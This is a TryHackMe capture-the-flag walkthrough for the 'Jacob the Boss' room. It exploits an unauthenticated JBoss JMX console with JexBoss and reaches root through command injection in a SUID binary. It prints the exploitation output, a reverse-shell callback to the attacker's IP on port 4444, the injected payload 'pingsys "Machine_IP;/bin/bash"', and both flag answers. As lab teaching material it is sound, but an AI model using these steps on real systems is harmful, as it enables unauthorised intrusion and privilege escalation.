# Jacob the Boss — TryHackMe Walkthrough

> Find a way in and learn a little more.

<p align="center">
<a href="https://tryhackme.com/room/jacobtheboss"><img src="data:image/jpeg;base64,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" alt="Jacob the Boss" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/jacobtheboss">
    <img src="https://img.shields.io/badge/TryHackMe-Jacob%20the%20Boss-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-JBoss%20RCE%20%7C%20SUID%20Binary%20Exploitation-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | JBoss Unauthenticated JMX Console Exploitation |
| 3 | SUID Binary Abuse (`pingsys`) |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Identify a JBoss application server and its exposed management interfaces through Nmap
- Use JexBoss to automatically detect and exploit unauthenticated JMX console access
- Obtain a stable reverse shell from a JexBoss command shell session
- Identify non-standard SUID binaries using `find`
- Exploit a custom SUID binary that passes user input unsanitised to a shell command to escalate to root

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Netcat, and JexBoss installed
- Add `Machine_IP jacobtheboss.box` to `/etc/hosts` before starting

---

## Task 1 — Go on, it's your machine!

---

### Step 1 — /etc/hosts Configuration

**Approach:** Before scanning, add the target to your hosts file so the hostname resolves correctly. JBoss references its own hostname in several places, so this is required for the exploitation tools to work properly.

```
echo "Machine_IP jacobtheboss.box" | sudo tee -a /etc/hosts
```

> **Note:** JexBoss and the JBoss management console reference `jacobtheboss.box` by hostname internally. Without this hosts entry, tools that follow redirects or make hostname-based requests will fail to connect correctly.

---

### Step 2 — Network Enumeration with Nmap

**Approach:** Run an aggressive Nmap scan with service detection, script scanning, OS detection, and the vuln script category to map all open services and check for known vulnerabilities in one pass.

```
kali@kali:~/CTFs/tryhackme/Jacob the Boss$ sudo nmap -A -sS -sC -sV --script vuln -O jacobtheboss.box
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 14:28 CEST
Nmap scan report for jacobtheboss.box (Machine_IP)
Host is up (0.034s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
| http-enum:
|   /icons/: Potentially interesting folder w/ directory listing
|   /public/: Potentially interesting folder w/ directory listing
|_  /themes/: Potentially interesting folder w/ directory listing
111/tcp  open  rpcbind     2-4 (RPC #100000)
1090/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
3306/tcp open  mysql       MariaDB (unauthorized)
4444/tcp open  java-rmi    Java RMI
4445/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-enum:
|   /web-console/ServerInfo.jsp: JBoss Console
|   /web-console/Invoker: JBoss Console
|   /invoker/JMXInvokerServlet: JBoss Console
|_  /jmx-console/: JBoss Console
| http-vuln-cve2010-0738:
|_  /jmx-console/: Authentication was not required
8083/tcp open  http        JBoss service httpd

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   33.86 ms 10.8.0.1
2   34.00 ms jacobtheboss.box (Machine_IP)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 296.73 seconds
```

> **Note:** The scan reveals a heavily exposed **JBoss application server** on port 8080. The critical finding is `http-vuln-cve2010-0738` — Nmap confirms that the `/jmx-console/` endpoint requires **no authentication**. The JMX (Java Management Extensions) console allows administrators to invoke Java MBean operations remotely — if unauthenticated, it gives an attacker direct code execution on the server. Ports 1090, 1098, 1099, 4444, 4445, and 4446 are all Java RMI and object serialisation endpoints associated with JBoss's internal communication stack.

---

### Step 3 — JBoss Exploitation with JexBoss

**Approach:** Use JexBoss to scan the JBoss server on port 8080 for vulnerable endpoints and exploit the unauthenticated JMX console to obtain a command shell. After getting the shell, read the user flag, then enumerate SUID binaries.

```
* --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * |
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 ** Checking Host: http://jacobtheboss.box:8080/ **

 [*] Checking jmx-console:
  [ VULNERABLE ]
 [*] Checking web-console:
  [ VULNERABLE ]
 [*] Checking JMXInvokerServlet:
  [ VULNERABLE ]
 [*] Checking admin-console:
  [ OK ]
 [*] Checking Application Deserialization:
  [ OK ]
 [*] Checking Servlet Deserialization:
  [ OK ]
 [*] Checking Jenkins:
  [ OK ]
 [*] Checking Struts2:
  [ OK ]

 * Do you want to try to run an automated exploitation via "jmx-console" ?
   yes/NO? yes

 * Sending exploit code to http://jacobtheboss.box:8080/. Please wait...
 * Successfully deployed code! Starting command shell. Please wait...

Linux jacobtheboss.box 3.10.0-1127.18.2.el7.x86_64 #1 SMP Sun Jul 26 15:27:06 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0

[Type commands or "exit" to finish]
Shell> cat /home/jacob/user.txt
f4d491f280de360cc49e26ca1587cbcc

[Type commands or "exit" to finish]
Shell> find / -type f -user root -perm -u=s 2>/dev/null
/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper

[Type commands or "exit" to finish]
Shell> jexremote=YOUR_IP:4444
```

> **Note:** JexBoss confirms three vulnerable endpoints: `jmx-console`, `web-console`, and `JMXInvokerServlet`. It exploits the JMX console by deploying a malicious WAR (Web Application Archive) file through the MBean server, which executes a command shell inside the JBoss JVM. The shell runs as `jacob` (UID 1001). Among the SUID binaries, `/usr/bin/pingsys` stands out — it is non-standard and not a default Linux binary, making it an immediate privilege escalation target. The `jexremote=YOUR_IP:4444` command instructs JexBoss to connect back with a reverse shell, which is more stable than the built-in command shell.

---

### Question 1 — user.txt

<details><summary>Reveal Answer</summary>

`f4d491f280de360cc49e26ca1587cbcc`

</details>

---

### Step 4 — Privilege Escalation via Custom SUID Binary (pingsys)

**Approach:** Catch the reverse shell from JexBoss on port 4444. The SUID binary `/usr/bin/pingsys` takes a host argument and passes it directly to a shell ping command without sanitisation. Inject a semicolon followed by `/bin/bash` to break out of the ping command and spawn a root shell.

```
kali@kali:~/CTFs/tryhackme/Jacob the Boss$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [YOUR_IP] from (UNKNOWN) [Machine_IP] 56188
id
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
/usr/bin/pingsys "Machine_IP;/bin/bash"
PING Machine_IP (Machine_IP) 56(84) bytes of data.
64 bytes from Machine_IP: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from Machine_IP: icmp_seq=2 ttl=64 time=0.030 ms
64 bytes from Machine_IP: icmp_seq=3 ttl=64 time=0.030 ms
64 bytes from Machine_IP: icmp_seq=4 ttl=64 time=0.029 ms

--- Machine_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.018/0.026/0.030/0.008 ms
id
uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
cd /root
ls
anaconda-ks.cfg
jboss.sh
original-ks.cfg
root.txt
cat root.txt
29a5641eaa0c01abe5749608c8232806
```

> **Note:** The `pingsys` binary has the SUID bit set and is owned by root — meaning it executes with root's effective UID regardless of who runs it. When the binary passes the user-supplied hostname directly to a shell command like `ping <input>`, the semicolon (`;`) acts as a command separator in bash. Everything after it — `/bin/bash` — runs as a second command, inheriting the root effective UID from the SUID bit. The `id` output confirms `uid=0(root)`. This is a classic **command injection via SUID binary** — the fix is to validate or whitelist the input so that only valid IP addresses or hostnames are accepted.

---

### Question 2 — root.txt

<details><summary>Reveal Answer</summary>

`29a5641eaa0c01abe5749608c8232806`

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Added `jacobtheboss.box` to `/etc/hosts` | Hostname resolves correctly for exploitation tools |
| 2 | Nmap scan with `--script vuln` | Identified unauthenticated JBoss JMX console on port 8080 |
| 3 | JexBoss exploitation of JMX console | Obtained command shell as `jacob`; retrieved user flag; identified non-standard SUID binary `pingsys` |
| 4 | JexBoss reverse shell on port 4444 | Established stable shell as `jacob` |
| 5 | Command injection via `/usr/bin/pingsys` | Escalated to root; retrieved root flag |
